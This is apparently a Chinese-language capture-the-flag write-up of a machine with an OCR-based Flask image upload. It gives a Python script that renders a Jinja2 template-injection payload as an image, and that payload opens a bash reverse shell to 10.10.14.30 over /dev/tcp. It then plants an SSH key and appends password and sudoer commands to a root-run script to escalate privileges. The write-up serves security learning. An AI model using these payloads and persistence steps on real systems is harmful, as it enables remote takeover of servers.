信息收集

nmap扫描，发现80端口，浏览器第一次访问时会有域名解析问题，要改一下/etc/resolv.conf加上对应的entry

网页上有上传图片的入口，上传之后图片会转成text的返回

同时有提示后端是flask，尝试模版注入

模版注入，拿到user Flag

制作图片，尝试最简单的payload {{7*7}}，返回49，说明成功解析了

发现后台对注入没有任何过滤

下面就制作payload，需要把payload转成图片，让后台把图片解析成代码并执行。

尝试的过程异常痛苦，字体，背景颜色，字体大小等等，经过反复尝试最终搞出了能稳定被ocr识别的payload图片。

早知如此应该写一个脚本：

  * 自动遍历所有字体
  * post上传图片的请求
  * 读返回的结果

和payload进行比对，应该就可以筛选出成功率最高的字体/大小。

最终的payload

from PIL import Image
from PIL import ImageDraw
from PIL import ImageFont
myfont = ImageFont.truetype(
    font='/usr/share/fonts/truetype/opentype/cantarell/Cantarell-Regular.otf', size=100, encoding='utf-8')
s = '''
{{  self.__init__.
__globals__['__builtins__'].
__import__("os").
popen('bash -c "bash -i>&/dev/tcp/10.10.14.30/9999 0>&1 &" ') }}
'''
img = Image.new('RGB', (4000, 1000),(255,255,255))
d = ImageDraw.Draw(img)
text_width, text_height = d.textsize(s)
d.multiline_text((text_width, text_height), text=s, font=myfont,stroke_width=2,fill="black")
img.save("tt.png", 'png')

本地nc -lv 9999，拿到user shell。在.ssh目录下加个key，之后直接免密登录

提权，拿到root flag

尝试get密码等敏感信息没有结果，没法通过密码sudo；找了所有权限是4000的文件，也没有可利用的二进制。

接下来就只有几条路：

  * 找到以root身份执行的脚本
  * application cve
  * kernel cve（打扰了？？）

先找找以root身份执行的脚本，推荐pspy工具，可以hook所有进程对文件的操作

发现每次ssh登录都会调用ssh-alert.sh脚本，同时还会执行chattr +a ssh-alert.sh（现实中应该不太可能有这种case，，，）

尝试了一下可以append这个脚本，于是把passwd，add sudoer等命令append进去，然后另起一个shell，ssh登进去。

之后直接sudo su加上刚刚改的密码，就可以进入root shell
